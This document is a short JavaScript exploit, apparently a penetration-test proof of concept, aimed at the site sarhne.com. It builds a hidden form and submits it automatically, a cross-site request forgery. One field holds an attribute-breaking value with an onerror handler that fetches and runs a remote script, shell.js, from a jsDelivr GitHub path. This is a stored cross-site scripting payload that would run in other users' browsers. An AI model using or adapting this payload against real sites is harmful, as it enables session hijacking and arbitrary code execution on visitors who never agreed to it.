
// Create a form dynamically
var sarhneForm = document.createElement("form");
sarhneForm.setAttribute("id", "sarhneForm");
sarhneForm.setAttribute("method", "post");
sarhneForm.setAttribute("action", "https://www.sarhne.com/processing.html");


// Create an hidden input element for name
var name = document.createElement("input");
name.setAttribute("type", "hidden");
name.setAttribute("name", "name");
name.setAttribute("value", "GhalyForPentest");


// Create an hidden input element for link
var link = document.createElement("input");
link.setAttribute("type", "hidden");
link.setAttribute("name", "link");
link.setAttribute("value", "ghalybbc");


// Create an hidden input element for pic
var pic = document.createElement("input");
pic.setAttribute("type", "hidden");
pic.setAttribute("name", "pic");
pic.setAttribute("value", 'https://cdn.jsdelivr.net/gh/ghalypr/shell/shell.js" onerror="$.getScript(this.src);');



 // create a submit button
 var s = document.createElement("input");
 s.setAttribute("type", "submit");
 s.setAttribute("value", "Submit");

sarhneForm.appendChild(name);
sarhneForm.appendChild(link);
sarhneForm.appendChild(pic);


document.getElementsByTagName("body")[0].appendChild(sarhneForm);

document.getElementById("sarhneForm").submit();

